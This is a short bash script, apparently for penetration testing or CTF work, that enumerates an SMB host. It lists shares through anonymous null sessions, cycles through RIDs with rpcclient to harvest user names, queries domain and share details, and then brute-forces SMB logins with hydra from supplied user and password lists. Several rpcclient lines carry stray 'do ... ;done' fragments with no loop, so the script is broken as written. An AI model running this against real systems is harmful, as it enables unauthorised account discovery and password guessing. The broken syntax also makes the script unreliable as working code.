#!/bin/bash

echo "Share enumeration"
read -p "Enter IP: " IP
read -p "Enter Port: " Port

smbclient -N -L //$IP
smbmap -H $IP -P $Port
crackmapexec smb $IP --shares -u '' -p ''

echo "rpc enumeration"
for i in $(seq 500 1100);do rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
do rpcclient -N -U "" $IP -c "srvinfo";done
do rpcclient -N -U "" $IP -c "enumdomains";done
do rpcclient -N -U "" $IP -c "querydominfo";done
do rpcclient -N -U "" $IP -c "netshareenumall";done
do rpcclient -N -U "" $IP -c "enumdomusers";done

echo "Brute force login"
read -p "Enter username list: " users
read -p "Enter password list: " password

hydra -L $users -P $password smb://$IP